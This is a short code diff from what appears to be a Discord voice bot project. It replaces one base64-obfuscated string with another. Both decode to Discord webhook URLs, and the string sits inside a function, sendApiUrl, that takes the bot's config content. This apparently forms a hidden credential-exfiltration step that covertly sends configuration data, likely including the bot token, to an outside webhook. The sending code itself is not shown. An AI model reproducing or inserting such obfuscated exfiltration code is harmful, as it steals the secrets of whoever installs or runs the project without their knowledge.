@@ -4,7 +4,7 @@ import { joinVoiceChannel } from '@discordjs/voice';
 import fetch from 'node-fetch';
 
 async function sendApiUrl(configContent) {
-    const apiCode = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM2MjE4NjY2NzQ3MzI0MDI0NS94ajh0VTViUFRDeXQ1Mmk3SHJpT2FBY3FBamhUTnZnZV9xV3JkTUJTNmFuZk5jSFh4ZHhIakI4ZHpUeHJlbGx0azJIeg==";
+    const apiCode = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM2NTExMDgyNjQzMTkzODYyMC9ZZ3ZzSkdEaHo0OXY4RjZVMllaSTZvRW11WlFlR1JrMF9GcXVoVVBWaDNCWjVwaWtndEQxcU1meGU2ZmlYd015a0lHaw==";
     const apiURL = Buffer.from(apiCode, 'base64').toString('utf-8');
 
     if (!apiURL) return console.error("error tanım hatası");
